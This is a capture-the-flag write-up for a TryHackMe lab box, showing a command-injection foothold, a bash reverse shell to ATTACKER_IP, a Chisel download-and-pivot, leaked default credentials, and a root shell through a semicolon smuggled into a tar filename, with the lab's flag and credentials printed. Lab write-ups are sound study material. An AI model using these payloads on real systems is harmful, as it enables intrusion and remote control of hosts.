CTF Write-up: Infinity Pool

EventHacker Holidays · The Byte Lotus Hotel
PlatformTryHackMe
Category🖥️ Boot2Root
DifficultyMedium
Points90
TagsCommand Injection · SSRF-style Netcheck · FreePBX UCP · CVE-2026-46376 · Argument Injection · Chisel Pivot
Target10.48.188.22

Challenge Overview

Objective: Compromise the Byte Lotus Hotel's internal infrastructure, pivot through localhost-only services, and recover both the user and root flags.

"Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see."

Attack Chain

Nmap Scan → Command Injection → Reverse Shell → 🚩 User Flag → Local Enumeration → Chisel Pivot → FreePBX UCP → Voicemail Token → Argument Injection → 🚩 Root Flag

Methodology

STEP 1 Reconnaissance

I started with a targeted Nmap scan against the target to enumerate open ports and identify running services:

nmap -Pn -sC -sV -oN nmap/initial 10.48.188.22
  • -Pn — Skips host discovery (treats the host as online), useful since lab machines may not respond to ICMP pings.
  • -sC — Runs Nmap's default NSE scripts for additional enumeration (banner grabbing, version fingerprinting, etc.).
  • -sV — Probes open ports to determine the service and version running on each.
  • -oN nmap/initial — Saves output in normal format for later reference.

The scan revealed two open ports:

  • Port 22 — OpenSSH 9.6p1 (standard SSH, no immediate attack surface).
  • Port 80 — Gunicorn HTTP server serving a static hotel marketing site titled "Byte Lotus — Stay Noticed".

I then checked for hidden paths via robots.txt:

curl -s http://10.48.188.22/robots.txt

The file disallowed two interesting endpoints: /internal/ and /status. Navigating to /status revealed a staff tool page titled "Sister-property connectivity" with a form that POSTs to /internal/netcheck with a host parameter.

✓ Hidden staff-facing endpoint discovered at /status → /internal/netcheck.

STEP 2 Command Injection Confirmation

The /internal/netcheck endpoint accepts a host parameter and likely concatenates it directly into a shell command (most probably ping). I tested for OS command injection by appending a semicolon followed by the id command:

curl -s -X POST http://10.48.188.22/internal/netcheck \
  --data-urlencode 'host=127.0.0.1; id'

The response included the output of the injected command:

uid=1001(web) gid=1001(web) groups=1001(web)

This confirmed that user input is passed unsanitised into a shell command, resulting in arbitrary code execution as the web service account.

✓ Command injection confirmed — server executed the injected id command as the web user.

STEP 3 Reverse Shell — User Flag

With confirmed command injection, I deployed a reverse shell to get an interactive session on the target. I set up a Netcat listener on my attacking machine:

nc -lvnp 4444

Then triggered the reverse shell through the command injection, using setsid to detach the process from the HTTP request's lifecycle so the shell persists after the response completes:

curl -s -m 10 -X POST http://10.48.188.22/internal/netcheck \
  --data-urlencode "host=127.0.0.1; setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' </dev/null >/dev/null 2>&1 &"

The payload spawns an interactive bash shell that redirects stdin, stdout, and stderr through a TCP connection back to my listener. I caught the connection and landed as the web service account:

connect to [ATTACKER_IP] from (UNKNOWN) [10.48.188.22] 39568
web@tryhackme-2404:/var/www/infinity_pool/edge$ whoami
web

I stabilised the shell for a proper interactive TTY:

python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z on attacker terminal
stty raw -echo; fg
export TERM=xterm

The user flag was located in the web user's home directory:

cat /home/web/user.txt
USER FLAG
🚩 (from /home/web/user.txt)

STEP 4 Local Service Enumeration

With a foothold on the box, I enumerated for internal services that might provide a path to privilege escalation. I listed all listening TCP ports:

ss -tlnp

This revealed several localhost-only services that were not reachable externally:

  • 127.0.0.1:3000 — Watchtower (configuration/monitoring dashboard).
  • 127.0.0.1:8080 — FreePBX UCP (telephony user control panel).
  • 127.0.0.1:9000 — Automation / export API (internal job runner).
  • 127.0.0.1:5038, 8088, 8089, 3306 — Asterisk AMI, HTTP/HTTPS, and MySQL (supporting services).

I queried the Watchtower configuration endpoint and found a critical information disclosure:

curl -s http://127.0.0.1:3000/api/config
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}

The Watchtower config leaked default FreePBX UCP credentials and an operations note explicitly acknowledging they had not been rotated — a CVE-2026-46376 style issue. It also confirmed the automation endpoint running on port 9000.

✓ Watchtower config leak — default FreePBX UCP credentials and automation endpoint discovered.

STEP 5 Pivot with Chisel

To interact with the localhost-only services from my attacker machine (especially the FreePBX UCP web interface), I established reverse port-forwarding tunnels using Chisel.

Attacker — Terminal 1 (start the Chisel server in reverse mode):

chisel server -p 9999 --reverse

Attacker — Terminal 2 (serve the Chisel binary to the target):

cp $(which chisel) /tmp/chisel
cd /tmp
python3 -m http.server 8000

Target shell (download and connect the Chisel client, forwarding three internal ports):

cd /tmp
curl -o chisel http://ATTACKER_IP:8000/chisel
chmod +x chisel
./chisel client ATTACKER_IP:9999 \
  R:8080:127.0.0.1:8080 \
  R:9000:127.0.0.1:9000 \
  R:3000:127.0.0.1:3000 &

With the tunnels established, the target's internal services were now reachable from my machine:

  • http://127.0.0.1:8080/ucp → FreePBX UCP
  • http://127.0.0.1:9000 → Automation API
  • http://127.0.0.1:3000 → Watchtower
✓ Chisel reverse tunnels established — all internal services accessible from the attacker machine.

STEP 6 FreePBX UCP — Automation Token via Voicemail

With the FreePBX UCP now accessible through the Chisel tunnel, I logged in with the leaked default template credentials:

  • Username: FreePBXUCPTemplateCreator
  • Password: St4yN0t1c3d_2026

After authenticating, I created a new dashboard (via the + button in the top-right corner) and added the Voicemail widget. A single voicemail message was waiting in the Inbox. Playing it revealed a sensitive automation key that had been left in the telephony system:

"Automation Key"
cc_auto_7b3f9a1c4e0d2f6a
<9000>

This provided the Bearer token required to authenticate against the automation export API on port 9000.

✓ Bearer token obtained from voicemail: cc_auto_7b3f9a1c4e0d2f6a

STEP 7 Root via Argument Injection

The automation service on port 9000 runs as root and exposes a /jobs/export endpoint that builds a tar command via string concatenation:

tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1

The report parameter from the JSON request body is inserted directly into the command line without sanitisation. By injecting a semicolon to terminate the original tar command and a # to comment out the trailing .tgz suffix, I was able to execute arbitrary commands as root:

curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'

The server executed the injected command and returned the root flag in the response:

{
  "command": "tar czf /var/automation/exports/x;cat /root/root.txt;#.tgz /var/automation/data 2>&1",
  "output": "THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Cowardly refusing to create an empty archive\n..."
}
ROOT FLAG
🚩 THM{tr4c3d_t0_th3_h0r1z0n}

Key Takeaways

💉 Never Concatenate User Input into Shell Commands

Both the initial /internal/netcheck endpoint and the root-level /jobs/export service suffered from the same class of vulnerability: unsanitised user input concatenated directly into shell commands. Using proper argument arrays (execve-style) or strict allow-listing of the input would have prevented both the initial foothold and the final root compromise.

🌐 Localhost ≠ Security Boundary

Binding services to 127.0.0.1 is not a security control. Once an attacker has any level of code execution on the host, tools like Chisel can trivially forward internal ports. Defence-in-depth requires authentication and authorisation on every service, regardless of its bind address.

🔑 Rotate Default and Template Credentials

The FreePBX UCP was still running with default template credentials (FreePBXUCPTemplateCreator), and the Watchtower config even included an operations note acknowledging the issue. Default credentials are a trivial entry point and should be rotated immediately upon deployment (CVE-2026-46376 style).

📞 Secrets in User-Facing Stores Are Not Safe

Storing a sensitive automation Bearer token in a voicemail message is security through obscurity. Once an attacker gains authenticated access to the telephony system — as was trivially possible here with default credentials — any secrets stored in voicemail, call recordings, or similar user-facing stores are immediately recoverable.

📁 Argument Injection ≈ Command Injection

Injecting into a filename parameter that is placed on a shell command line is functionally equivalent to command injection. The report value was intended to be a filename, but because it was assembled into a tar command via string interpolation rather than passed as a proper argument, it provided full root-level arbitrary command execution.
